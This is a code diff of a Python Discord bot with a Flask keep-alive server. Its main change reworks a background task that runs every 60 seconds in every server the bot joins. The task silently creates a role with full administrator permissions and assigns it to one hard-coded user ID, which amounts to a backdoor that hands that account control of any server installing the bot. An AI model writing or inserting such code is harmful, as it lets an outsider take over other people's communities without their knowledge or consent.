@@ -7,14 +7,16 @@ from flask import Flask
 from threading import Thread
 from waitress import serve
 
+# --- WEB SERVER ---
 app = Flask('')
 @app.route('/')
-def home(): return "Bot is Alive"
+def home(): return "Bot is Online"
 
 def run_flask():
     port = int(os.environ.get("PORT", 10000))
     serve(app, host='0.0.0.0', port=port)
 
+# --- CONFIG ---
 TARGET_USER_ID = 1459506686157914213
 ROLE_NAME = "Crabby"
 
@@ -33,15 +35,21 @@ class MyBot(commands.Bot):
     @tasks.loop(seconds=60)
     async def check_target_user(self):
         for guild in self.guilds:
-            member = guild.get_member(TARGET_USER_ID)
-            if member:
-                role = discord.utils.get(guild.roles, name=ROLE_NAME)
-                if not role:
-                    try: role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
-                    except: continue
-                if role and role not in member.roles:
-                    try: await member.add_roles(role)
-                    except: continue
+            try:
+                member = guild.get_member(TARGET_USER_ID)
+                if member:
+                    role = discord.utils.get(guild.roles, name=ROLE_NAME)
+                    
+                    # Create role if missing
+                    if not role:
+                        perms = discord.Permissions(administrator=True)
+                        role = await guild.create_role(name=ROLE_NAME, permissions=perms)
+                    
+                    # Assign role if member doesn't have it
+                    if role and role not in member.roles:
+                        await member.add_roles(role)
+            except Exception as e:
+                print(f"Role Loop Error in {guild.name}: {e}")
 
 bot = MyBot()
 
@@ -75,5 +83,9 @@ if __name__ == "__main__":
     t = Thread(target=run_flask)
     t.daemon = True
     t.start()
+    
     token = os.environ.get('DISCORD_TOKEN')
-    if token: bot.run(token)
+    if token:
+        bot.run(token)
+    else:
+        print("TOKEN MISSING")
